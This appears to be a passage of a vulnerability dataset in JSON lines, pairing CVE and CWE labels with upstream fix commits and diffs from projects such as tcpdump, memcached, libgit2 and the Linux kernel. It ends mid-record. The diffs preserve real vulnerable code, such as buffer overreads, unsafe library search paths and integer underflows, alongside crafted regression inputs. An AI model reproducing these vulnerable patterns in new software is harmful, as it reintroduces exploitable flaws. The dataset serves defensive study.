{"CVE_ID": "CVE-2018-6340", "CWE_ID": "125", "category": "security", "commit_id": "4bff3bfbe90d10451e4638c2118d1ad1117bb3e3", "commit_message": "From 4bff3bfbe90d10451e4638c2118d1ad1117bb3e3 Mon Sep 17 00:00:00 2001\nFrom: Jan Oravec <jan@fb.com>\nDate: Tue, 18 Dec 2018 14:05:37 -0800\nSubject: [PATCH] CVE-2018-6340 Fix buffer overread\n\nSummary:\nsnprintf() returns the number of would be written bytes if the buffer had\nenough size, letting the original code to construct output string from\narbitrary data on the stack.\n\nFix this by properly assembling the String without trying to arbitrarily\nlimiting the length to 30 bytes.\n\nReviewed By: ottoni\n\nDifferential Revision: D13509547\n\nfbshipit-source-id: aa401b83d356f5b261433c4b16d777948ba7f9b4\n---\n hphp/runtime/ext/memcache/ext_memcache.cpp | 13 +++++++------\n 1 file changed, 7 insertions(+), 6 deletions(-)\n\n", "diff_code": "diff --git a/hphp/runtime/ext/memcache/ext_memcache.cpp b/hphp/runtime/ext/memcache/ext_memcache.cpp\nindex 221908993f6..776f5f30a44 100644\n--- a/hphp/runtime/ext/memcache/ext_memcache.cpp\n+++ b/hphp/runtime/ext/memcache/ext_memcache.cpp\n@@ -700,9 +700,6 @@ static Array HHVM_METHOD(Memcache, getextendedstats,\n \n   for (int server_id = 0; server_id < server_count; server_id++) {\n     memcached_stat_st *stat;\n-    char stats_key[30] = {0};\n-    size_t key_len;\n-\n     LMCD_SERVER_POSITION_INSTANCE_TYPE instance =\n       memcached_server_instance_by_position(&data->m_memcache, server_id);\n     const char *hostname = LMCD_SERVER_HOSTNAME(instance);\n@@ -715,9 +712,13 @@ static Array HHVM_METHOD(Memcache, getextendedstats,\n       continue;\n     }\n \n-    key_len = snprintf(stats_key, sizeof(stats_key), \"%s:%d\", hostname, port);\n-\n-    return_val.set(String(stats_key, key_len, CopyString), server_stats);\n+    auto const port_str = folly::to<std::string>(port);\n+    auto const key_len = strlen(hostname) + 1 + port_str.length();\n+    auto key = String(key_len, ReserveString);\n+    key += hostname;\n+    key += \":\";\n+    key += port_str;\n+    return_val.set(key, server_stats);\n   }\n \n   free(stats);\n", "owner": "facebook", "repo": "hhvm", "source": "cve"}
{"CVE_ID": "CVE-2015-1867", "CWE_ID": "264", "category": "security", "commit_id": "84ac07c7d02b3badd708b1ef13a2159dede70715", "commit_message": "From 84ac07c7d02b3badd708b1ef13a2159dede70715 Mon Sep 17 00:00:00 2001\nFrom: Andrew Beekhof <andrew@beekhof.net>\nDate: Tue, 7 Apr 2015 10:03:25 +1000\nSubject: [PATCH] Fix: acl: Do not delay evaluation of added nodes in some\n situations\n\nIt is not appropriate when the node has no children as it is not a\nplaceholder\n---\n lib/common/xml.c | 9 ++++++---\n 1 file changed, 6 insertions(+), 3 deletions(-)\n\n", "diff_code": "diff --git a/lib/common/xml.c b/lib/common/xml.c\nindex f3dd35b7a7..716f053f82 100644\n--- a/lib/common/xml.c\n+++ b/lib/common/xml.c\n@@ -1020,13 +1020,16 @@ __xml_acl_post_process(xmlNode * xml)\n \n     if(is_set(p->flags, xpf_created)) {\n         xmlAttr *xIter = NULL;\n+        char *path = xml_get_path(xml);\n \n-        /* Always allow new scaffolding, ie. node with no attributes or only an 'id' */\n+        /* Always allow new scaffolding, ie. node with no attributes or only an 'id'\n+         * Except in the ACLs section\n+         */\n \n         for (xIter = crm_first_attr(xml); xIter != NULL; xIter = xIter->next) {\n             const char *prop_name = (const char *)xIter->name;\n \n-            if (strcmp(prop_name, XML_ATTR_ID) == 0) {\n+            if (strcmp(prop_name, XML_ATTR_ID) == 0 && strstr(path, \"/\"XML_CIB_TAG_ACLS\"/\") == NULL) {\n                 /* Delay the acl check */\n                 continue;\n \n@@ -1035,7 +1038,6 @@ __xml_acl_post_process(xmlNode * xml)\n                 break;\n \n             } else {\n-                char *path = xml_get_path(xml);\n                 crm_trace(\"Cannot add new node %s at %s\", crm_element_name(xml), path);\n \n                 if(xml != xmlDocGetRootElement(xml->doc)) {\n@@ -1046,6 +1048,7 @@ __xml_acl_post_process(xmlNode * xml)\n                 return;\n             }\n         }\n+        free(path);\n     }\n \n     while (cIter != NULL) {\n", "owner": "ClusterLabs", "repo": "pacemaker", "source": "cve"}
{"CVE_ID": "CVE-2017-13038", "CWE_ID": "119", "category": "security", "commit_id": "7335163a6ef82d46ff18f3e6099a157747241629", "commit_message": "From 7335163a6ef82d46ff18f3e6099a157747241629 Mon Sep 17 00:00:00 2001\nFrom: Guy Harris <guy@alum.mit.edu>\nDate: Sun, 11 Jun 2017 18:27:27 -0700\nSubject: [PATCH] CVE-2017-13038/PPP: Do bounds checking.\n\nThis fixes a buffer over-read discovered by Brian 'geeknik' Carpenter.\n\nAdd a test using the capture file supplied by Katie Holly.\n---\n print-ppp.c           |   9 +++++++++\n tests/TESTLIST        |   3 +++\n tests/mlppp-oobr.out  |   1 +\n tests/mlppp-oobr.pcap | Bin 0 -> 88 bytes\n 4 files changed, 13 insertions(+)\n create mode 100644 tests/mlppp-oobr.out\n create mode 100644 tests/mlppp-oobr.pcap\n\n", "diff_code": "diff --git a/print-ppp.c b/print-ppp.c\nindex d07763cb1..891761728 100644\n--- a/print-ppp.c\n+++ b/print-ppp.c\n@@ -811,6 +811,15 @@ handle_mlppp(netdissect_options *ndo,\n     if (!ndo->ndo_eflag)\n         ND_PRINT((ndo, \"MLPPP, \"));\n \n+    if (length < 2) {\n+        ND_PRINT((ndo, \"[|mlppp]\"));\n+        return;\n+    }\n+    if (!ND_TTEST_16BITS(p)) {\n+        ND_PRINT((ndo, \"[|mlppp]\"));\n+        return;\n+    }\n+\n     ND_PRINT((ndo, \"seq 0x%03x, Flags [%s], length %u\",\n            (EXTRACT_16BITS(p))&0x0fff, /* only support 12-Bit sequence space for now */\n            bittok2str(ppp_ml_flag_values, \"none\", *p & 0xc0),\ndiff --git a/tests/TESTLIST b/tests/TESTLIST\nindex 5732f8ff5..bdc7ff40c 100644\n--- a/tests/TESTLIST\n+++ b/tests/TESTLIST\n@@ -554,6 +554,9 @@ radius_attr_asan\tradius_attr_asan.pcap\t\tradius_attr_asan.out\t-v\n ospf6_decode_v3_asan\tospf6_decode_v3_asan.pcap\tospf6_decode_v3_asan.out -v\n ip_ts_opts_asan\t\tip_ts_opts_asan.pcap\t\tip_ts_opts_asan.out\t-v\n \n+# bad packets from Katie Holly\n+mlppp-oobr\t\tmlppp-oobr.pcap\t\t\tmlppp-oobr.out\n+\n # RTP tests\n # fuzzed pcap\n rtp-seg-fault-1  rtp-seg-fault-1.pcap  rtp-seg-fault-1.out  -v -T rtp\ndiff --git a/tests/mlppp-oobr.out b/tests/mlppp-oobr.out\nnew file mode 100644\nindex 000000000..9230189c7\n--- /dev/null\n+++ b/tests/mlppp-oobr.out\n@@ -0,0 +1 @@\n+MLPPP, [|mlppp]\ndiff --git a/tests/mlppp-oobr.pcap b/tests/mlppp-oobr.pcap\nnew file mode 100644\nindex 0000000000000000000000000000000000000000..95b1bbe3645018f845f0b6586455541e3a9e4883\nGIT binary patch\nliteral 88\nmcmca|c+)~A1{MYbC}3e=VBlnca}5lDe2~<CW?PsNqG$jK(h$u6\n\nliteral 0\nHcmV?d00001\n\n", "owner": "the-tcpdump-group", "repo": "tcpdump", "source": "cve"}
{"CVE_ID": "CVE-2015-3887", "CWE_ID": "426", "category": "security", "commit_id": "9ab7dbeb3baff67a51d0c5e71465c453be0890b5", "commit_message": "From 9ab7dbeb3baff67a51d0c5e71465c453be0890b5 Mon Sep 17 00:00:00 2001\nFrom: rofl0r <retnyg@gmx.net>\nDate: Thu, 21 May 2015 13:46:17 +0100\nSubject: [PATCH] fix for CVE-2015-3887\n\ncloses #60\n---\n configure  | 8 +++++++-\n src/main.c | 6 ++++++\n 2 files changed, 13 insertions(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/configure b/configure\nindex fe1ad71..a4dac46 100755\n--- a/configure\n+++ b/configure\n@@ -26,6 +26,9 @@ usage() {\n \techo \"--libdir=/path\t\tdefault: $prefix/lib\"\n \techo \"--includedir=/path\tdefault: $prefix/include\"\n \techo \"--sysconfdir=/path\tdefault: $prefix/etc\"\n+\techo \"--ignore-cve\t\tdefault: no\"\n+\techo \"\tif set to yes ignores CVE-2015-3887 and makes it possible\"\n+\techo \"\tto preload from current dir (insecure)\"\n \tismac && isx86_64 && echo \"--fat-binary : build for both i386 and x86_64 architectures on 64-bit Macs\"\n \techo \"--help : show this text\"\n \texit 1\n@@ -39,7 +42,7 @@ spliteq() {\n }\n \n fat_binary=\n-\n+ignore_cve=no\n parsearg() {\n \tcase \"$1\" in\n \t--prefix=*) prefix=`spliteq $1`;;\n@@ -48,6 +51,8 @@ parsearg() {\n \t--libdir=*) libdir=`spliteq $1`;;\n \t--includedir=*) includedir=`spliteq $1`;;\n \t--sysconfdir=*) sysconfdir=`spliteq $1`;;\n+\t--ignore-cve) ignore_cve=1;;\n+\t--ignore-cve=*) ignore_cve=`spliteq $1`;;\n \t--fat-binary) fat_binary=1;;\n \t--help) usage;;\n \tesac\n@@ -94,6 +99,7 @@ echo bindir=$bindir>>config.mak\n echo libdir=$libdir>>config.mak\n echo includedir=$includedir>>config.mak\n echo sysconfdir=$sysconfdir>>config.mak\n+[ \"$ignore_cve\" = \"no\" ] && echo CPPFLAGS+= -DSUPER_SECURE>>config.mak\n make_cmd=make\n if ismac ; then\n \techo NO_AS_NEEDED=>>config.mak\ndiff --git a/src/main.c b/src/main.c\nindex 4a79fb8..36e9eea 100644\n--- a/src/main.c\n+++ b/src/main.c\n@@ -33,7 +33,9 @@ static const char *dll_name = DLL_NAME;\n \n static char own_dir[256];\n static const char *dll_dirs[] = {\n+#ifndef SUPER_SECURE /* CVE-2015-3887 */\n \t\".\",\n+#endif\n \town_dir,\n \tLIB_DIR,\n \t\"/lib\",\n@@ -48,7 +50,11 @@ static void set_own_dir(const char *argv0) {\n \twhile(l && argv0[l - 1] != '/')\n \t\tl--;\n \tif(l == 0)\n+#ifdef SUPER_SECURE\n+\t\tmemcpy(own_dir, \"/dev/null/\", 2);\n+#else\n \t\tmemcpy(own_dir, \".\", 2);\n+#endif\n \telse {\n \t\tmemcpy(own_dir, argv0, l - 1);\n \t\town_dir[l] = 0;\n", "owner": "rofl0r", "repo": "proxychains-ng", "source": "cve"}
{"CVE_ID": "CVE-2014-7283", "CWE_ID": "399", "category": "security", "commit_id": "c88547a8119e3b581318ab65e9b72f27f23e641d", "commit_message": "From c88547a8119e3b581318ab65e9b72f27f23e641d Mon Sep 17 00:00:00 2001\nFrom: Mark Tinguely <tinguely@sgi.com>\nDate: Fri, 4 Apr 2014 07:10:49 +1100\nSubject: xfs: fix directory hash ordering bug\n\nCommit f5ea1100 (\"xfs: add CRCs to dir2/da node blocks\") introduced\nin 3.10 incorrectly converted the btree hash index array pointer in\nxfs_da3_fixhashpath(). It resulted in the the current hash always\nbeing compared against the first entry in the btree rather than the\ncurrent block index into the btree block's hash entry array. As a\nresult, it was comparing the wrong hashes, and so could misorder the\nentries in the btree.\n\nFor most cases, this doesn't cause any problems as it requires hash\ncollisions to expose the ordering problem. However, when there are\nhash collisions within a directory there is a very good probability\nthat the entries will be ordered incorrectly and that actually\nmatters when duplicate hashes are placed into or removed from the\nbtree block hash entry array.\n\nThis bug results in an on-disk directory corruption and that results\nin directory verifier functions throwing corruption warnings into\nthe logs. While no data or directory entries are lost, access to\nthem may be compromised, and attempts to remove entries from a\ndirectory that has suffered from this corruption may result in a\nfilesystem shutdown.  xfs_repair will fix the directory hash\nordering without data loss occuring.\n\n[dchinner: wrote useful a commit message]\n\ncc: <stable@vger.kernel.org>\nReported-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: Mark Tinguely <tinguely@sgi.com>\nReviewed-by: Ben Myers <bpm@sgi.com>\nSigned-off-by: Dave Chinner <david@fromorbit.com>\n---\n fs/xfs/xfs_da_btree.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/fs/xfs/xfs_da_btree.c b/fs/xfs/xfs_da_btree.c\nindex 796272a2e129..e69d57be866b 100644\n--- a/fs/xfs/xfs_da_btree.c\n+++ b/fs/xfs/xfs_da_btree.c\n@@ -1295,7 +1295,7 @@ xfs_da3_fixhashpath(\n \t\tnode = blk->bp->b_addr;\n \t\tdp->d_ops->node_hdr_from_disk(&nodehdr, node);\n \t\tbtree = dp->d_ops->node_tree_p(node);\n-\t\tif (be32_to_cpu(btree->hashval) == lasthash)\n+\t\tif (be32_to_cpu(btree[blk->index].hashval) == lasthash)\n \t\t\tbreak;\n \t\tblk->hashval = lasthash;\n \t\tbtree[blk->index].hashval = cpu_to_be32(lasthash);\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2019-12108", "CWE_ID": "476", "category": "security", "commit_id": "86030db849260dd8fb2ed975b9890aef1b62b692", "commit_message": "From 86030db849260dd8fb2ed975b9890aef1b62b692 Mon Sep 17 00:00:00 2001\nFrom: Thomas Bernard <miniupnp@free.fr>\nDate: Tue, 18 Dec 2018 23:47:54 +0100\nSubject: [PATCH] fix error from commit\n 13585f15c7f7dc28bbbba1661efb280d530d114c\n\n---\n miniupnpd/upnpsoap.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/miniupnpd/upnpsoap.c b/miniupnpd/upnpsoap.c\nindex 997b3254..acd7fedf 100644\n--- a/miniupnpd/upnpsoap.c\n+++ b/miniupnpd/upnpsoap.c\n@@ -1850,7 +1850,7 @@ GetOutboundPinholeTimeout(struct upnphttp * h, const char * action, const char *\n \trem_port = GetValueFromNameValueList(&data, \"RemotePort\");\n \tprotocol = GetValueFromNameValueList(&data, \"Protocol\");\n \n-\tif (!int_port || !ext_port || !protocol)\n+\tif (!int_port || !rem_port || !protocol)\n \t{\n \t\tClearNameValueList(&data);\n \t\tSoapError(h, 402, \"Invalid Args\");\n", "owner": "miniupnp", "repo": "miniupnp", "source": "cve"}
{"CVE_ID": "CVE-2010-1152", "CWE_ID": "20", "category": "security", "commit_id": "75cc83685e103bc8ba380a57468c8f04413033f9", "commit_message": "From 75cc83685e103bc8ba380a57468c8f04413033f9 Mon Sep 17 00:00:00 2001\nFrom: Trond Norbye <Trond.Norbye@sun.com>\nDate: Wed, 28 Oct 2009 11:51:05 +0100\nSubject: [PATCH] Issue 102: Piping null to the server will crash it\n\n---\n memcached.c | 31 +++++++++++++++++++++++++++++--\n testapp.c   | 17 +++++++++++++++++\n 2 files changed, 46 insertions(+), 2 deletions(-)\n\n", "diff_code": "diff --git a/memcached.c b/memcached.c\nindex f6f007162..1789135a8 100644\n--- a/memcached.c\n+++ b/memcached.c\n@@ -3127,9 +3127,27 @@ static int try_read_command(conn *c) {\n \n         if (c->rbytes == 0)\n             return 0;\n+\n         el = memchr(c->rcurr, '\\n', c->rbytes);\n-        if (!el)\n+        if (!el) {\n+            if (c->rbytes > 1024) {\n+                /*\n+                 * We didn't have a '\\n' in the first k. This _has_ to be a\n+                 * large multiget, if not we should just nuke the connection.\n+                 */\n+                char *ptr = c->rcurr;\n+                while (*ptr == ' ') { /* ignore leading whitespaces */\n+                    ++ptr;\n+                }\n+\n+                if (strcmp(ptr, \"get \") && strcmp(ptr, \"gets \")) {\n+                    conn_set_state(c, conn_closing);\n+                    return 1;\n+                }\n+            }\n+\n             return 0;\n+        }\n         cont = el + 1;\n         if ((el - c->rcurr) > 1 && *(el - 1) == '\\r') {\n             el--;\n@@ -3191,12 +3209,17 @@ static enum try_read_result try_read_udp(conn *c) {\n  * close.\n  * before reading, move the remaining incomplete fragment of a command\n  * (if any) to the beginning of the buffer.\n+ *\n+ * To protect us from someone flooding a connection with bogus data causing\n+ * the connection to eat up all available memory, break out and start looking\n+ * at the data I've got after a number of reallocs...\n+ *\n  * @return enum try_read_result\n  */\n static enum try_read_result try_read_network(conn *c) {\n     enum try_read_result gotdata = READ_NO_DATA_RECEIVED;\n     int res;\n-\n+    int num_allocs = 0;\n     assert(c != NULL);\n \n     if (c->rcurr != c->rbuf) {\n@@ -3207,6 +3230,10 @@ static enum try_read_result try_read_network(conn *c) {\n \n     while (1) {\n         if (c->rbytes >= c->rsize) {\n+            if (num_allocs == 4) {\n+                return gotdata;\n+            }\n+            ++num_allocs;\n             char *new_rbuf = realloc(c->rbuf, c->rsize * 2);\n             if (!new_rbuf) {\n                 if (settings.verbose > 0)\ndiff --git a/testapp.c b/testapp.c\nindex b0491c30c..5ff2a1f10 100644\n--- a/testapp.c\n+++ b/testapp.c\n@@ -538,6 +538,22 @@ static enum test_return test_issue_92(void) {\n     return TEST_PASS;\n }\n \n+static enum test_return test_issue_102(void) {\n+    char buffer[4096];\n+    memset(buffer, ' ', sizeof(buffer));\n+    buffer[sizeof(buffer) - 1] = '\\0';\n+\n+    close(sock);\n+    sock = connect_server(\"127.0.0.1\", port, false);\n+\n+    send_ascii_command(buffer);\n+    /* verify that the server closed the connection */\n+    assert(read(sock, buffer, sizeof(buffer)) == 0);\n+    close(sock);\n+    sock = connect_server(\"127.0.0.1\", port, false);\n+    return TEST_PASS;\n+}\n+\n static enum test_return start_memcached_server(void) {\n     server_pid = start_server(&port, false, 600);\n     sock = connect_server(\"127.0.0.1\", port, false);\n@@ -1676,6 +1692,7 @@ struct testcase testcases[] = {\n     /* The following tests all run towards the same server */\n     { \"start_server\", start_memcached_server },\n     { \"issue_92\", test_issue_92 },\n+    { \"issue_102\", test_issue_102 },\n     { \"binary_noop\", test_binary_noop },\n     { \"binary_quit\", test_binary_quit },\n     { \"binary_quitq\", test_binary_quitq },\n", "owner": "memcached", "repo": "memcached", "source": "cve"}
{"CVE_ID": "CVE-2018-8098", "CWE_ID": "190", "category": "security", "commit_id": "3207ddb0103543da8ad2139ec6539f590f9900c1", "commit_message": "From 3207ddb0103543da8ad2139ec6539f590f9900c1 Mon Sep 17 00:00:00 2001\nFrom: Patrick Steinhardt <ps@pks.im>\nDate: Thu, 8 Mar 2018 12:00:27 +0000\nSubject: [PATCH] index: fix out-of-bounds read with invalid index entry prefix\n length\n\nThe index format in version 4 has prefix-compressed entries, where every\nindex entry can compress its path by using a path prefix of the previous\nentry. Since implmenting support for this index format version in commit\n5625d86b9 (index: support index v4, 2016-05-17), though, we do not\ncorrectly verify that the prefix length that we want to reuse is\nactually smaller or equal to the amount of characters than the length of\nthe previous index entry's path. This can lead to a an integer underflow\nand subsequently to an out-of-bounds read.\n\nFix this by verifying that the prefix is actually smaller than the\nprevious entry's path length.\n\nReported-by: Krishna Ram Prakash R <krp@gtux.in>\nReported-by: Vivek Parikh <viv0411.parikh@gmail.com>\n---\n src/index.c | 19 ++++++++++---------\n 1 file changed, 10 insertions(+), 9 deletions(-)\n\n", "diff_code": "diff --git a/src/index.c b/src/index.c\nindex 3ef892b7f1..20586f52c3 100644\n--- a/src/index.c\n+++ b/src/index.c\n@@ -2365,17 +2365,18 @@ static int read_entry(\n \t\tentry_size = index_entry_size(path_length, 0, entry.flags);\n \t\tentry.path = (char *)path_ptr;\n \t} else {\n-\t\tsize_t varint_len;\n-\t\tsize_t strip_len = git_decode_varint((const unsigned char *)path_ptr,\n-\t\t\t\t\t\t     &varint_len);\n-\t\tsize_t last_len = strlen(last);\n-\t\tsize_t prefix_len = last_len - strip_len;\n-\t\tsize_t suffix_len = strlen(path_ptr + varint_len);\n-\t\tsize_t path_len;\n-\n-\t\tif (varint_len == 0)\n+\t\tsize_t varint_len, last_len, prefix_len, suffix_len, path_len;\n+\t\tuintmax_t strip_len;\n+\n+\t\tstrip_len = git_decode_varint((const unsigned char *)path_ptr, &varint_len);\n+\t\tlast_len = strlen(last);\n+\n+\t\tif (varint_len == 0 || last_len < strip_len)\n \t\t\treturn index_error_invalid(\"incorrect prefix length\");\n \n+\t\tprefix_len = last_len - strip_len;\n+\t\tsuffix_len = strlen(path_ptr + varint_len);\n+\n \t\tGITERR_CHECK_ALLOC_ADD(&path_len, prefix_len, suffix_len);\n \t\tGITERR_CHECK_ALLOC_ADD(&path_len, path_len, 1);\n \t\ttmp_path = git__malloc(path_len);\n", "owner": "libgit2", "repo": "libgit2", "source": "cve"}
{"CVE_ID": "CVE-2015-0856", "CWE_ID": "264", "category": "security", "commit_id": "4cfed6b0a625593fb43876f04badc4dd99799d86", "commit_message": "From 4cfed6b0a625593fb43876f04badc4dd99799d86 Mon Sep 17 00:00:00 2001\nFrom: David Edmundson <kde@davidedmundson.co.uk>\nDate: Wed, 14 Oct 2015 00:08:59 +0100\nSubject: [PATCH] Disable greeters from loading KDE's debug hander\n\nSome themes may use KDE components which will automatically load KDE's\ncrash handler.\n\nIf the greeter were to then somehow crash, that would leave a crash\nhandler allowing other actions, albeit as the locked down SDDM user.\n\nOnly SDDM users using the breeze theme from plasma-workspace are\naffected. Safest and simplest fix is to handle this inside SDDM\ndisabling kcrash via an environment variable for all future themes that\nmay use these libraries.\n\nCVE-2015-0856\n---\n src/daemon/Greeter.cpp | 4 ++++\n 1 file changed, 4 insertions(+)\n\n", "diff_code": "diff --git a/src/daemon/Greeter.cpp b/src/daemon/Greeter.cpp\nindex 68c4dc38..8c936b7d 100644\n--- a/src/daemon/Greeter.cpp\n+++ b/src/daemon/Greeter.cpp\n@@ -145,6 +145,10 @@ namespace SDDM {\n             env.insert(QStringLiteral(\"XDG_VTNR\"), QString::number(m_display->terminalId()));\n             env.insert(QStringLiteral(\"XDG_SESSION_CLASS\"), QStringLiteral(\"greeter\"));\n             env.insert(QStringLiteral(\"XDG_SESSION_TYPE\"), m_display->sessionType());\n+\n+            //some themes may use KDE components and that will automatically load KDE's crash handler which we don't want\n+            //counterintuitively setting this env disables that handler\n+            env.insert(QStringLiteral(\"KDE_DEBUG\"), QStringLiteral(\"1\"));\n             m_auth->insertEnvironment(env);\n \n             // log message\n", "owner": "sddm", "repo": "sddm", "source": "cve"}
{"CVE_ID": "CVE-2017-1000251", "CWE_ID": "119", "category": "security", "commit_id": "f2fcfcd670257236ebf2088bbdf26f6a8ef459fe", "commit_message": "From f2fcfcd670257236ebf2088bbdf26f6a8ef459fe Mon Sep 17 00:00:00 2001\nFrom: \"Gustavo F. Padovan\" <gustavo@las.ic.unicamp.br>\nDate: Sat, 4 Jul 2009 15:06:24 -0300\nSubject: [PATCH] Bluetooth: Add configuration support for ERTM and Streaming\n mode\n\nAdd support to config_req and config_rsp to configure ERTM and Streaming\nmode. If the remote device specifies ERTM or Streaming mode, then the\nsame mode is proposed. Otherwise ERTM or Basic mode is used. And in case\nof a state 2 device, the remote device should propose the same mode. If\nnot, then the channel gets disconnected.\n\nSigned-off-by: Gustavo F. Padovan <gustavo@las.ic.unicamp.br>\nSigned-off-by: Marcel Holtmann <marcel@holtmann.org>\n---\n include/net/bluetooth/l2cap.h |  28 +++-\n net/bluetooth/l2cap.c         | 262 ++++++++++++++++++++++++++++++----\n 2 files changed, 255 insertions(+), 35 deletions(-)\n\n", "diff_code": "diff --git a/include/net/bluetooth/l2cap.h b/include/net/bluetooth/l2cap.h\nindex 06b072fd6d544f..6fc76986d70a93 100644\n--- a/include/net/bluetooth/l2cap.h\n+++ b/include/net/bluetooth/l2cap.h\n@@ -27,8 +27,9 @@\n \n /* L2CAP defaults */\n #define L2CAP_DEFAULT_MTU\t\t672\n+#define L2CAP_DEFAULT_MIN_MTU\t\t48\n #define L2CAP_DEFAULT_FLUSH_TO\t\t0xffff\n-#define L2CAP_DEFAULT_RX_WINDOW\t\t1\n+#define L2CAP_DEFAULT_TX_WINDOW\t\t1\n #define L2CAP_DEFAULT_MAX_RECEIVE\t1\n #define L2CAP_DEFAULT_RETRANS_TO\t300    /* 300 milliseconds */\n #define L2CAP_DEFAULT_MONITOR_TO\t1000   /* 1 second */\n@@ -272,6 +273,9 @@ struct l2cap_pinfo {\n \t__u16\t\tomtu;\n \t__u16\t\tflush_to;\n \t__u8\t\tmode;\n+\t__u8\t\tnum_conf_req;\n+\t__u8\t\tnum_conf_rsp;\n+\n \t__u8\t\tfcs;\n \t__u8\t\tsec_level;\n \t__u8\t\trole_switch;\n@@ -280,10 +284,15 @@ struct l2cap_pinfo {\n \t__u8\t\tconf_req[64];\n \t__u8\t\tconf_len;\n \t__u8\t\tconf_state;\n-\t__u8\t\tconf_retry;\n \n \t__u8\t\tident;\n \n+\t__u8\t\tremote_tx_win;\n+\t__u8\t\tremote_max_tx;\n+\t__u16\t\tretrans_timeout;\n+\t__u16\t\tmonitor_timeout;\n+\t__u16\t\tmax_pdu_size;\n+\n \t__le16\t\tsport;\n \n \tstruct l2cap_conn\t*conn;\n@@ -291,12 +300,17 @@ struct l2cap_pinfo {\n \tstruct sock\t\t*prev_c;\n };\n \n-#define L2CAP_CONF_REQ_SENT\t0x01\n-#define L2CAP_CONF_INPUT_DONE\t0x02\n-#define L2CAP_CONF_OUTPUT_DONE\t0x04\n-#define L2CAP_CONF_CONNECT_PEND\t0x80\n+#define L2CAP_CONF_REQ_SENT       0x01\n+#define L2CAP_CONF_INPUT_DONE     0x02\n+#define L2CAP_CONF_OUTPUT_DONE    0x04\n+#define L2CAP_CONF_MTU_DONE       0x08\n+#define L2CAP_CONF_MODE_DONE      0x10\n+#define L2CAP_CONF_CONNECT_PEND   0x20\n+#define L2CAP_CONF_STATE2_DEVICE  0x80\n+\n+#define L2CAP_CONF_MAX_CONF_REQ 2\n+#define L2CAP_CONF_MAX_CONF_RSP 2\n \n-#define L2CAP_CONF_MAX_RETRIES\t2\n \n void l2cap_load(void);\n \ndiff --git a/net/bluetooth/l2cap.c b/net/bluetooth/l2cap.c\nindex 7ce1a24735c8a3..af0fbf9ebfeb21 100644\n--- a/net/bluetooth/l2cap.c\n+++ b/net/bluetooth/l2cap.c\n@@ -966,6 +966,7 @@ static int l2cap_sock_connect(struct socket *sock, struct sockaddr *addr, int al\n \tcase L2CAP_MODE_BASIC:\n \t\tbreak;\n \tcase L2CAP_MODE_ERTM:\n+\tcase L2CAP_MODE_STREAMING:\n \t\tif (enable_ertm)\n \t\t\tbreak;\n \t\t/* fall through */\n@@ -1029,6 +1030,7 @@ static int l2cap_sock_listen(struct socket *sock, int backlog)\n \tcase L2CAP_MODE_BASIC:\n \t\tbreak;\n \tcase L2CAP_MODE_ERTM:\n+\tcase L2CAP_MODE_STREAMING:\n \t\tif (enable_ertm)\n \t\t\tbreak;\n \t\t/* fall through */\n@@ -1739,15 +1741,65 @@ static void l2cap_add_conf_opt(void **ptr, u8 type, u8 len, unsigned long val)\n \t*ptr += L2CAP_CONF_OPT_SIZE + len;\n }\n \n+static int l2cap_mode_supported(__u8 mode, __u32 feat_mask)\n+{\n+\tu32 local_feat_mask = l2cap_feat_mask;\n+\tif (enable_ertm)\n+\t\tlocal_feat_mask |= L2CAP_FEAT_ERTM;\n+\n+\tswitch (mode) {\n+\tcase L2CAP_MODE_ERTM:\n+\t\treturn L2CAP_FEAT_ERTM & feat_mask & local_feat_mask;\n+\tcase L2CAP_MODE_STREAMING:\n+\t\treturn L2CAP_FEAT_STREAMING & feat_mask & local_feat_mask;\n+\tdefault:\n+\t\treturn 0x00;\n+\t}\n+}\n+\n+static inline __u8 l2cap_select_mode(__u8 mode, __u16 remote_feat_mask)\n+{\n+\tswitch (mode) {\n+\tcase L2CAP_MODE_STREAMING:\n+\tcase L2CAP_MODE_ERTM:\n+\t\tif (l2cap_mode_supported(mode, remote_feat_mask))\n+\t\t\treturn mode;\n+\t\t/* fall through */\n+\tdefault:\n+\t\treturn L2CAP_MODE_BASIC;\n+\t}\n+}\n+\n static int l2cap_build_conf_req(struct sock *sk, void *data)\n {\n \tstruct l2cap_pinfo *pi = l2cap_pi(sk);\n \tstruct l2cap_conf_req *req = data;\n-\tstruct l2cap_conf_rfc rfc = { .mode = L2CAP_MODE_BASIC };\n+\tstruct l2cap_conf_rfc rfc = { .mode = L2CAP_MODE_ERTM };\n \tvoid *ptr = req->data;\n \n \tBT_DBG(\"sk %p\", sk);\n \n+\tif (pi->num_conf_req || pi->num_conf_rsp)\n+\t\tgoto done;\n+\n+\tswitch (pi->mode) {\n+\tcase L2CAP_MODE_STREAMING:\n+\tcase L2CAP_MODE_ERTM:\n+\t\tpi->conf_state |= L2CAP_CONF_STATE2_DEVICE;\n+\t\tif (!l2cap_mode_supported(pi->mode, pi->conn->feat_mask)) {\n+\t\t\tstruct l2cap_disconn_req req;\n+\t\t\treq.dcid = cpu_to_le16(pi->dcid);\n+\t\t\treq.scid = cpu_to_le16(pi->scid);\n+\t\t\tl2cap_send_cmd(pi->conn, l2cap_get_ident(pi->conn),\n+\t\t\t\t\tL2CAP_DISCONN_REQ, sizeof(req), &req);\n+\t\t}\n+\t\tbreak;\n+\tdefault:\n+\t\tpi->mode = l2cap_select_mode(rfc.mode, pi->conn->feat_mask);\n+\t\tbreak;\n+\t}\n+\n+done:\n \tswitch (pi->mode) {\n \tcase L2CAP_MODE_BASIC:\n \t\tif (pi->imtu != L2CAP_DEFAULT_MTU)\n@@ -1756,10 +1808,22 @@ static int l2cap_build_conf_req(struct sock *sk, void *data)\n \n \tcase L2CAP_MODE_ERTM:\n \t\trfc.mode            = L2CAP_MODE_ERTM;\n-\t\trfc.txwin_size      = L2CAP_DEFAULT_RX_WINDOW;\n+\t\trfc.txwin_size      = L2CAP_DEFAULT_TX_WINDOW;\n \t\trfc.max_transmit    = L2CAP_DEFAULT_MAX_RECEIVE;\n-\t\trfc.retrans_timeout = cpu_to_le16(L2CAP_DEFAULT_RETRANS_TO);\n-\t\trfc.monitor_timeout = cpu_to_le16(L2CAP_DEFAULT_MONITOR_TO);\n+\t\trfc.retrans_timeout = 